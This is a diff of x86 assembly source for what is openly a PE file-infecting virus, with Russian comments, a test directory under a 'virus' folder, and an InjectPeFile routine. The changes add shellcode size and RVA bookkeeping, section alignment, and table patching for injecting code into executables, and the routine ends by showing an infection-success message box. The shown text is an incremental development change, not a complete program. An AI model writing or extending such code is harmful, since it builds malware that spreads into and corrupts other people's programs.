@@ -139,7 +139,6 @@ Freeze proto CurrentStdcallNotation
 InjectCode proto CurrentStdcallNotation :cword, :cword, :cword
 ExtendLastSection proto CurrentStdcallNotation :cword, :cword, :cword, :cword
 
-
 DefineStdcallProto MessageBoxA, 4
 DefineStdcallProto VirtualProtect, 4
 DefineStdcallProto GetModuleHandleA, 1
@@ -190,8 +189,9 @@ else
 endif
 
 isFirst db 1	; 1 - если дроп первого шеллкода, потом будет везде 0
-targetDir db "C:/work/code/virus/test", 0 
+targetDir db "C:/work/code/virus/test/test", 0 
 originalEP dq 0
+scInfo SC_PARAMS <0>
 
 
 ;"C:\work\code\virus\test", 0 ;db 260 dup (0)
@@ -249,6 +249,8 @@ INJECTION_SIGN 	equ 050h
     local pVASc:cword
     local pSections:cword
     local pTargetSection:cword
+    local offsetAllData:dword
+    local globalSCSize:cword
 
     mov [pVASc], 0
 
@@ -302,12 +304,30 @@ INJECTION_SIGN 	equ 050h
         ret
     .endif
 
+    DbgBreak
+    mov cax, [pVASc]
+    mov [cbx+scInfo].SC_PARAMS.startRVA, cax 
+
+    mov cax, totalEnd - start
+    mov [cbx+scInfo].SC_PARAMS.sizeCurrSc, cax
+    mov [globalSCSize], cax
+
+    mov cdi, [pe]
+    lea cdx, [cdi].IMAGE_NT_HEADERS.OptionalHeader
+    invoke AlignToTop, [globalSCSize], [cdx].IMAGE_OPTIONAL_HEADER.SectionAlignment
+    invoke HandleAllTables, [pe], [pVASc], [globalSCSize], eax
+
     ; сдвигаем все, что ниже
+    
 
     invoke sc_MessageBoxA, NULL, addr [cbx + msgInfectionSuccess], MB_OK, 0
 
     ret
 InjectPeFile endp
+
+
+
+
 
 ;
 ; Внедрение в PE-файлы в директории dirName
